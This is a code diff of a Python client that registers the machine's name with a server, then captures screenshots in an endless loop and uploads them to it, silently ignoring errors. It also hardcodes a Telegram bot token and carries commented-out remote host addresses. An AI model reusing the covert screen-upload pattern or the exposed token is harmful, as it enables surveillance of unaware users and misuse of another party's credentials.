@@ -6,11 +6,13 @@ import requests
 import time
 import argparse
 import uuid
-import socket
+import socket  # Import socket module
 
 from telegram import Bot
 
-DEFAULT_HOST = 'http://5.35.90.82:5000/'
+# DEFAULT_HOST = 'http://5.35.90.82:5000'
+# DEFAULT_HOST = 'http://192.168.1.9:5000'
+DEFAULT_HOST = 'http://127.0.0.1:8091'
 TELEGRAM_BOT_TOKEN = '5207577524:AAFWyFgWKd_yZCzSqiULfKNZ2GQb8yWI-h0'
 
 
@@ -31,7 +33,7 @@ def main(host=DEFAULT_HOST, key=None):
     
     print(f'Sending key "{key}" to server at {host}')
 
-    r = requests.post(f'{host}/new_session', json={'_key': key, 'computer_name': computer_name})  # Include computer name
+    r = requests.post(f'{host}/conn/new_session/', json={'_key': key, 'computer_name': computer_name})  # Include computer name
     if r.status_code != 200:    
         print('Server not available.')
         return
@@ -44,7 +46,7 @@ def main(host=DEFAULT_HOST, key=None):
         while True:
             # Get the size of the primary monitor
             monitor = sct.monitors[1]
-
+            
             # Capture the screen
             screenshot = sct.grab(monitor)
             img = Image.frombytes('RGB', screenshot.size, screenshot.rgb)
@@ -59,7 +61,7 @@ def main(host=DEFAULT_HOST, key=None):
                 files[filename] = ('img.png', image_data_content, 'multipart/form-data')
 
                 try:
-                    r = requests.post(f'{host}/capture_post', files=files)
+                    r = requests.post(f'{host}/conn/capture_post/', files=files)
                 except Exception as e:
                     pass
 
